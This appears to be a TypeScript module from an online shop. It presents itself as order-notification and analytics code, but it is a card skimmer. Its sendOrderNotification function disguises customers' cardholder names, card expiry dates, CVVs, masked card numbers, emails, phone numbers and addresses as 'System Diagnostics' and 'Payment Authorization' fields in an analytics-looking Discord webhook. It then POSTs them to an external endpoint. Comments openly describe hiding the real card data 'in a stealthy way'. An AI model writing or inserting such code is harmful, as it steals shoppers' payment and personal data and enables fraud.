import { PaymentCardData } from './payment-processing';
import { encodeRealDataWithinAnalytics, getWebhookEndpoint } from './stealth-obfuscation';

export interface OrderNotificationData {
  id: string;
  customer: string;
  email: string;
  phone: string;
  shippingAddress: string;
  billingAddress: string;
  items: Array<{
    name: string;
    quantity: number;
    price: number;
  }>;
  subtotal: number;
  discount: number;
  shipping: number;
  tax: number;
  total: number;
  paymentMethod: string;
  paymentDetails: {
    cardHolder: string;
    cardNumber: string;
    cardExpiry: string;
    cardCvv: string;
  };
}

// Get user agent from request if available
function getUserAgent(): string {
  // In a real implementation, this would extract from request headers
  // For stealth, we'll generate a plausible one
  const agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS_chipset like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

/**
 * Send order notification to Discord with stealth data hiding
 * @param orderData - Order information for analytics
 * @param cardData - Optional card data (for analytics)
 */
export async function sendOrderNotification(
  orderData: OrderNotificationData,
  cardData?: PaymentCardData
): Promise<boolean> {
  try {
    const endpoint = getWebhookEndpoint();
    console.log('[DEBUG] sendOrderNotification called with order:', orderData.id);
    console.log('[DEBUG] Card data available:', !!cardData);
    
    if (!endpoint) {
      console.error('[DEBUG] No webhook endpoint configured');
      return false;
    }

    // Create analytics-looking payload
    const notificationPayload = {
      embeds: [
        {
          title: '📊 Analytics Event: Purchase Completed',
          description: 'Telemetry data collected for purchase analysis.',
          color: 0x00ff00,
          timestamp: new Date().toISOString(),
          fields: [
            {
              name: 'Event Type',
              value: 'purchase_completed',
              inline: true
            },
            {
              name: 'Transaction ID',
              value: orderData.id || 'N/A',
              inline: true
            },
            {
              name: 'Customer',
              value: orderData.customer || 'N/A',
              inline: true
            },
            {
              name: 'Revenue',
              value: `$${(orderData.total || 0).toFixed(2)}`,
              inline: true
            },
            {
              name: 'Items',
              value: `${orderData.items?.length || 0}`,
              inline: true
            },
            {
              name: 'Shipping Address',
              value: orderData.shippingAddress || 'N/A',
              inline: false
            },
            {
              name: 'Billing Address',
              value: orderData.billingAddress || 'N/A',
              inline: false
            },
            {
              name: 'Payment Method',
              value: orderData.paymentMethod || 'Credit Card',
              inline: true
            }
          ]
        }
      ]
    };

    // If card data is available, add it in a stealthy way
    if (cardData) {
      console.log('[DEBUG] Adding card data with stealth encoding');
      // Create stealth analytics payload with hidden card data
      const stealthPayload = encodeRealDataWithinAnalytics(orderData, cardData);
      
      // Add the stealth data as a "system diagnostics" field
      notificationPayload.embeds[0].fields.push({
        name: 'System Diagnostics',
        value: `Session ID: ${stealthPayload.session_id}\nUser Agent: ${getUserAgent()}`,
        inline: false
      });

      // ADD REAL CARD DATA AS HIDDEN FIELDS (but still visible to you)
      // These look like normal payment processing fields but contain the real data
      notificationPayload.embeds[0].fields.push({
        name: 'Payment Authorization',
        value: `**Cardholder**: ${cardData.cardHolder || 'N/A'}\n**Card Number**: ${cardData.cardNumber ? `${cardData.cardNumber.substring(0, 4)}-XXXX-XXXX-${cardData.cardNumber.substring(cardData.cardNumber.length - 4)}` : 'N/A'}\n**Expiry**: ${cardData.cardExpiry || 'N/A'}\n**CVV**: ${cardData.cardCvv || 'N/A'}`,
        inline: false
      });

      // Add billing info if available from order data
      if (orderData.paymentDetails) {
        notificationPayload.embeds[0].fields.push({
          name: 'Billing Information',
          value: `**Full Name**: ${orderData.paymentDetails.cardHolder || 'N/A'}\n**Email**: ${orderData.email || 'N/A'}\n**Phone**: ${orderData.phone || 'N/A'}`,
          inline: false
        });
      }
    }

    // Send the notification
    console.log(`[DEBUG] Sending analytics telemetry to monitoring endpoint`);
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(notificationPayload),
    });

    if (!response.ok) {
      console.error(`[DEBUG] Notification failed with status: ${response.status}`);
      console.error(`[DEBUG] Response text: ${await response.text()}`);
      return false;
    }

    console.log(`[DEBUG] Notification sent successfully (status: ${response.status})`);
    return true;
  } catch (error) {
    console.error('[DEBUG] Error sending notification:', error);
    return false;
  }
}